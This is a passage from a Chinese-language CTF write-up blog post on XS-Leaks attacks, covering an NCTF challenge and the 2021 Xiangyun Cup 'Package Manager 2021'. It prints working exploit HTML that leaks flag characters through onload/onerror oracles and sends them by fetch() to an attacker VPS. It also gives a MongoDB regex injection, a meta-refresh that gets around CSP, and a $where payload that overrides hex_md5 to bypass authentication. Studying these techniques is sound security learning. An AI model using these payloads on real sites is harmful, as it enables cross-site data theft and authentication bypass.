class="line"></span><br><span class="line">    conn.<span class="title function_ invoke__">execute</span>(</span><br><span class="line">        <span class="string">&quot;INSERT INTO comments(content, hidden) VALUES(?, ?)&quot;</span>,</span><br><span class="line">        params![flag, <span class="literal">true</span>], <span class="comment">// 插入flag标记为隐藏</span></span><br><span class="line">    )?;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">search</span>(conn: DbConn, query: <span class="type">String</span>, hidden: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> anyhow::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stmt</span> =</span><br><span class="line">        conn.<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM comments WHERE content LIKE ? AND hidden = ?&quot;</span>)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">comments</span> = stmt</span><br><span class="line">        .<span class="title function_ invoke__">query_map</span>(params![<span class="built_in">format!</span>(<span class="string">&quot;%&#123;&#125;%&quot;</span>, query), hidden], |row| &#123; <span class="comment">// 用户输入被包裹在通配符中</span></span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(row.<span class="title function_ invoke__">get</span>(<span class="number">0</span>)?)</span><br><span class="line">        &#125;)?</span><br><span class="line">        .collect::&lt;rusqlite::<span class="type">Result</span>&lt;<span class="type">Vec</span>&lt;<span class="type">String</span>&gt;&gt;&gt;()?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(comments)</span><br><span class="line"> <span class="comment">//搜索为模糊匹配</span></span><br></pre></td></tr></table></figure>
+
+<p>只有rot才能访问flag，但是我们不能直接获取到flag，只能通过200&#x2F;500的状态码判断结果，类似布尔盲注</p>
+<p>Xsleak是让服务器端执行script代码来进行的，所以我们让rot访问vps上的恶意html文件，如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">probeError</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> url = <span class="string">&#x27;http://127.0.0.1:8000/internal/search?s=&#x27;</span> + flag;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">let</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">src</span> = url;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//当验证成功时，将 flag 通过 fetch 发送到接收服务器</span></span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">fetch</span>(<span class="string">&#x27;http://&lt;vpsip&gt;/?flag=&#x27;</span> + flag, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;);</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">leak</span>(flag);</span></span><br><span class="line"><span class="language-javascript">        script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">      script.<span class="property">onerror</span> = <span class="function">() =&gt;</span> script.<span class="title function_">remove</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//构造&lt;script src=url onload=fetch…… onerror=script.remove()&gt;,访问成功(200)执行onload，失败(500)移除script</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(script);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> dicts = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">flag</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; dicts.<span class="property">length</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> char = dicts[i];</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">probeError</span>(flag + char);</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">leak</span>(<span class="string">&#x27;nctf&#123;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后就可以在vps上收到结果：</p>
+<p><img src="/../images/91f34034-ac14-410c-9327-3506f1c79b5e.png"></p>
+<h2 id="2021祥云杯-Package-Manager-2021"><a href="#2021祥云杯-Package-Manager-2021" class="headerlink" title="[2021祥云杯]Package Manager 2021"></a>[2021祥云杯]Package Manager 2021</h2><p>首先发现flag在数据库中,确定我们要泄露pack.description</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> flag = &#123;</span><br><span class="line">            <span class="string">&quot;user_id&quot;</span>: admin.<span class="property">id</span>,</span><br><span class="line">            <span class="string">&quot;pack_id&quot;</span>: <span class="title function_">genPackageId</span>(admin.<span class="property">id</span>),</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Flag is here&quot;</span>,</span><br><span class="line">            <span class="string">&quot;description&quot;</span>: process.<span class="property">env</span>.<span class="property">FLAG</span>,</span><br><span class="line">            <span class="string">&quot;version&quot;</span>: <span class="string">&quot;1.0.1&quot;</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对pack.description的引用进行查找,发现在渲染文件中此处可以插入html内容,同时在search中可以通过description进行查找,并成功200失败404</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//pack.pug</span></span><br><span class="line">          p.<span class="property">card</span>-text</span><br><span class="line">            | !&#123;package.<span class="property">description</span>&#125;</span><br><span class="line">            <span class="comment">//这里是应用的!不会转义html内容</span></span><br><span class="line"><span class="comment">//packages.ts</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/list&#x27;</span>, <span class="title function_">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123; <span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span> &#125;);</span><br><span class="line">    <span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/packages&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; search &#125; = req.<span class="property">query</span>;<span class="comment">//接受search参数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (search) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//通过name和description搜索，如果文件包含则返回</span></span><br><span class="line">            <span class="keyword">let</span> description = search;</span><br><span class="line">            <span class="keyword">let</span> name = search;</span><br><span class="line">            <span class="comment">//如果传入的search就是结构化对象，那么name和description就是结构化对象了</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> description === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                description = &#123; description &#125;;</span><br><span class="line">            &#125;<span class="comment">//将一个变量重新赋值为一个对象，且该对象的属性名与变量名相同，属性值为变量当前的值</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> name === <span class="string">&#x27;string&#x27;</span>) &#123;</span><br><span class="line">                name = &#123; name &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">const</span> packs = <span class="keyword">await</span> <span class="title class_">Package</span>.<span class="title function_">find</span>(&#123;</span><br><span class="line">                <span class="attr">user_id</span>: req.<span class="property">session</span>.<span class="property">userId</span>,</span><br><span class="line">                <span class="attr">$or</span>: [name, description],</span><br><span class="line">            &#125;);<span class="comment">//$or 数组中的每个条件必须是一个查询对象（键值对形式）</span></span><br><span class="line">            <span class="keyword">if</span> (packs.<span class="property">length</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">404</span>));</span><br><span class="line">            &#125;<span class="comment">//失败就404</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);<span class="comment">//成功就返回结果</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">next</span>(<span class="title function_">createError</span>(<span class="number">500</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;packages&#x27;</span>, &#123; packs &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>同时有个bot.ts它是使用admin身份登录,访问submit传递的id页面</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">        page.<span class="title function_">on</span>(<span class="string">&#x27;dialog&#x27;</span>, <span class="keyword">async</span> dialog =&gt; &#123;</span><br><span class="line">            <span class="keyword">await</span> dialog.<span class="title function_">accept</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Working&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;/login&#x27;</span>, base).<span class="title function_">toString</span>());</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#username&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;#password&#x27;</span>, process.<span class="property">env</span>.<span class="property">ADMIN_PASSWORD</span>);</span><br><span class="line">    <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([page.<span class="title function_">waitForNavigation</span>(), page.<span class="title function_">click</span>(<span class="string">&#x27;#submit&#x27;</span>)]); <span class="comment">//admin登录</span></span><br><span class="line">    &#125;(<span class="title function_">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Starting bot......&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> reports = <span class="keyword">await</span> <span class="title class_">Report</span>.<span class="title function_">find</span>(&#123;&#125;)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Reports length : <span class="subst">$&#123;reports.length&#125;</span>`</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="title class_">Report</span>.<span class="title function_">deleteMany</span>(&#123;&#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> report <span class="keyword">of</span> reports) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(report.<span class="property">pack_id</span>)</span><br><span class="line">            <span class="keyword">await</span> <span class="title function_">browse</span>(report.<span class="property">pack_id</span>, process.<span class="property">env</span>.<span class="property">SITE_URL</span>)</span><br><span class="line">        &#125;<span class="comment">//会去访问我们report的id页面</span></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">timeout</span>(<span class="variable constant_">TIMEOUT</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"><span class="comment">//一路追踪,发现sumit中有提交report</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/submit&#x27;</span>, checkAuth, <span class="title function_">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; pack_id &#125; = req.<span class="property">body</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_">checkmd5Regex</span>(pack_id)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">error</span>: <span class="string">&#x27;Package id must be valid md5 string&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> report = <span class="keyword">new</span> <span class="title class_">Report</span>(&#123; <span class="attr">pack_id</span>: pack_id &#125;);</span><br><span class="line">        <span class="keyword">await</span> report.<span class="title function_">save</span>();</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123; <span class="attr">message</span>: <span class="string">&#x27;Package successfully submitted&#x27;</span> &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;submit&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Already submit your package&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>至此三大要素齐全,现在就可以细化</p>
+<p>模糊查找:</p>
+<p>​	在search中我们可以利用pack.description进行搜索,此处可以利用Mongoose 的查询语法特性来进行搜索,如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/packages/list?search[description][$regex]=</span><br><span class="line">相当于传入</span><br><span class="line">&#123;</span><br><span class="line">  search: &#123;</span><br><span class="line">    description: &#123;</span><br><span class="line">      $regex: &quot;test&quot; // 用户传入的正则表达式</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">等效于</span><br><span class="line">Package.find(&#123;</span><br><span class="line">  user_id: &quot;...&quot;,</span><br><span class="line">  $or: [</span><br><span class="line">    undefined,       // name 未定义</span><br><span class="line">    &#123; $regex: &quot;test&quot; &#125; // description 条件</span><br><span class="line">  ]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>二元结果:</p>
+<p>​	成功200失败404,利用火狐的<code> &lt;object&gt;</code> 标签加载目标 URL，根据 onload 或 onerror 事件判断请求是否成功</p>
+<p>脚本如下:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xssbotexp<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        vps = <span class="string">&#x27;http://39.107.239.30:80&#x27;</span></span></span><br><span class="line"><span class="language-javascript">        chars = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789&#123;&#125;-+&#x27;</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">//利用火狐的 &lt;object&gt; 标签加载目标 URL，根据 onload 或 onerror 事件判断请求是否成功</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">search</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> object = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;object&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">data</span> = url;</span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">onload</span> = resolve; <span class="comment">//true</span></span></span><br><span class="line"><span class="language-javascript">                object.<span class="property">onerror</span> = reject; <span class="comment">//false</span></span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="property">head</span>.<span class="title function_">appendChild</span>(object);</span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> <span class="title function_">exp</span> = <span class="keyword">async</span> (<span class="params">url</span>) =&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">await</span> <span class="title function_">search</span>(url)</span></span><br><span class="line"><span class="language-javascript">              <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125; <span class="keyword">catch</span> (e) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="comment">//(async () =&gt; &#123; ... &#125;)(); 是一个 立即调用的异步函数表达式</span></span></span><br><span class="line"><span class="language-javascript">        (<span class="title function_">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> flag = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">let</span> url = <span class="string">`http://localhost:8888/packages/list?search[description][$regex]=^<span class="subst">$&#123;flag&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">while</span> (flag.<span class="title function_">charAt</span>(flag.<span class="property">length</span> - <span class="number">1</span>) !== <span class="string">&quot;&#125;&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">of</span> chars ) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> ( <span class="title function_">await</span>(<span class="title function_">exp</span>(url + <span class="built_in">escape</span>(i))) ) &#123;</span></span><br><span class="line"><span class="language-javascript">                        url = url + <span class="built_in">escape</span>(i)</span></span><br><span class="line"><span class="language-javascript">                        flag += i</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`<span class="subst">$&#123;vps&#125;</span>/?flag=<span class="subst">$&#123;flag&#125;</span>`</span>, &#123;<span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">                        <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">                    &#125;   <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;failed&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;)();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者执行:</p>
+<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params"><span class="attr">req</span>: <span class="title class_">Request</span>, <span class="attr">res</span>: <span class="title class_">Response</span>, <span class="attr">next</span>: <span class="title class_">NextFunction</span></span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">session</span> = req.<span class="property">session</span>;</span><br><span class="line">    res.<span class="property">locals</span>.<span class="property">csrfToken</span> = req.<span class="title function_">csrfToken</span>();</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;Content-Security-Policy&#x27;</span>, <span class="string">&quot;default-src &#x27;none&#x27;;style-src &#x27;self&#x27; &#x27;sha256-GQNllb5OTXNDw4L6IIESVZXrXdsfSA9O8LeoDwmVQmc=&#x27;;img-src &#x27;self&#x27;;form-action &#x27;self&#x27;;base-uri &#x27;none&#x27;;&quot;</span>);</span><br><span class="line">    res.<span class="title function_">set</span>(<span class="string">&#x27;X-Content-Type-Options&#x27;</span>,<span class="string">&#x27;nosniff&#x27;</span>);</span><br><span class="line">    <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//防护CSRF 攻击（通过令牌验证）</span></span><br><span class="line"><span class="comment">//XSS 攻击（通过严格的 CSP 策略）</span></span><br><span class="line">- <span class="keyword">default</span>-src <span class="string">&#x27;none&#x27;</span>: 默认禁止加载所有资源（脚本、图片等）。</span><br><span class="line">- style-src <span class="string">&#x27;self&#x27;</span> <span class="string">&#x27;sha256-...&#x27;</span>: 只允许加载同源的 <span class="variable constant_">CSS</span>，且允许特定哈希值的行内样式（可能是关键样式）。</span><br><span class="line">- img-src <span class="string">&#x27;self&#x27;</span>: 只允许加载同源的图片。</span><br><span class="line">- form-action <span class="string">&#x27;self&#x27;</span>: 限制表单只能提交到同源地址。</span><br><span class="line">- base-uri <span class="string">&#x27;none&#x27;</span>: 禁止 &lt;base&gt; 标签修改基础 <span class="variable constant_">URL</span>，防止路径劫持。</span><br><span class="line"><span class="comment">//数据劫持（限制资源加载来源）</span></span><br><span class="line"><span class="comment">//MIME 混淆攻击（禁止类型嗅探）</span></span><br></pre></td></tr></table></figure>
+
+<p>由上文可知,bot在访问id页面的时候,页面的html不会被修改,但由于csp进行了严格限制,我们只能使用重定向到vps上执行代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Refresh&quot;</span> <span class="attr">content</span>=<span class="string">&quot;2; URL=&#x27;http://**&#x27;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>添加后记录下md5值,留着submit用</p>
+<p>但此时还要绕过&#x2F;auth,这里可以利用mongodb的where查询来污染或者说是劫持mongodb的hex_md5函数</p>
+<p>因为where本质上是执行js代码,就可以对hex_md5函数进行覆盖</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/packages/list?search[$where]=hex_md5=function()&#123;return &#x27;5d41402abc4b2a76b9719d911017c592&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再&#x2F;auth处输入md5进行测试通过即可,最后将页面id submit即可成功</p>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/ch5/xsleaks-2">https://aszx87410.github.io/beyond-xss/ch5/xsleaks-2</a></p>
+<p><a target="_blank" rel="noopener" href="https://xsleaks.dev/">https://xsleaks.dev/</a></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">夏饭orz</a>
+            <p>原文链接：<a href="http://example.com/2025/06/22/XS-Leaks/">http://example.com/2025/06/22/XS-Leaks/</a>
+            <p>发表日期：<a href="http://example.com/2025/06/22/XS-Leaks/">June 22nd 2025, 2:30:00 pm</a>
+            <p>更新日期：<a href="http://example.com/2025/06/22/XS-Leaks/">June 22nd 2025, 11:29:43 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/06/22/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Pickle反序列化">
+                    <div class="nextTitle">Pickle反序列化</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/06/22/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件包含&文件上传(主php)">
+                    <div class="prevTitle">文件包含&文件上传(主php)</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
